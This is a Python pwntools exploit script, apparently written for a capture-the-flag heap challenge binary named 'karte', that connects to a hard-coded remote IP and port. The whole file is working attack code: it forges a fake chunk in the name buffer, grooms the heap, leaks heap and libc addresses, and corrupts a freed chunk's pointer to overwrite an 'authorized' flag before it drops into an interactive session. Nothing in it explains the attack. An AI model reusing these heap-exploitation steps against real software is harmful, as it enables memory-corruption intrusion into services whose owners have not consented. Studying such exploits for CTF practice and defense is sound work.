from pwn import *

#r = process("./karte")
r = remote("35.221.81.216",30005)
#r = remote("172.17.0.1")
#binary = ELF("./karte")
#note_arr = binary.symbols["vec"]
note_arr = 0x404060
name = 0x404160
authorized = 0x0000000000404180
def alloc(vec_id,size):
    log.info("alloc[%d] sz -> %d" % (vec_id,size))
    r.sendlineafter(">","0")
    r.sendlineafter(">",str(vec_id))
    r.sendlineafter(">",str(size))

def extend(vec_id,size):
    r.sendlineafter(">","1")
    r.sendlineafter(">",str(vec_id))
    r.sendlineafter(">",str(size))

def change_id(vec_id,new_id):
    r.sendlineafter(">","2")
    r.sendlineafter(">",str(vec_id))
    r.sendlineafter(">",str(new_id))

def show(vec_id):
    r.sendlineafter(">","3")
    r.sendlineafter(">",str(vec_id))

def dealloc(vec_id):
    log.info("free[%d]" % vec_id)
    r.sendlineafter(">","4")
    r.sendlineafter(">",str(vec_id))


name = 0x404160
fake_name = p64(0x0) + p64(0x21) + p64(name) + p64(name)
fake_name = fake_name[:-1]

r.sendlineafter("What's your name > ",fake_name)
exclude = [1, 3, 5, 7, 9, 11, 13]
for i in range(15):
    alloc(i,0x50)
alloc(15,0x50)
alloc(16,0x50)
alloc(17,0x50)
alloc(18,0x50)
for i in range(15):
    if i in exclude:
        continue
    extend(i, 0x80)
    #dealloc(i)
dealloc(1)
dealloc(3)
dealloc(5)
dealloc(7)
dealloc(9)
dealloc(11)
dealloc(13)

dealloc(16)
dealloc(18)

#dealloc(15)
#dealloc(8)

show(5)
r.recvuntil("size: ")
heap_leak = r.recvline().rstrip()
heap_leak = int(heap_leak,16)
log.info("heap leak -> "+hex(heap_leak))

#for i in [0, 2, 4, 6, 8, 10, 12, 14]:
    #print(i)
    #extend(i, 0x90)
for i in [0, 2, 4, 6, 8, 10, 12, 14]:
    dealloc(i)
alloc(1234, 0xa0)

show(heap_leak + 0x4e0)
r.recvuntil("size: ")
libc_leak = r.recvline().rstrip()
libc_leak = int(libc_leak,16)
log.info("libc leak -> "+hex(libc_leak))

target = 0x00404180
change_id(libc_leak, target - 0x10)

for i in range(7):
    alloc(4321+i, 0x50)
alloc(6969, 0x50)
r.sendline("5")

r.interactive()

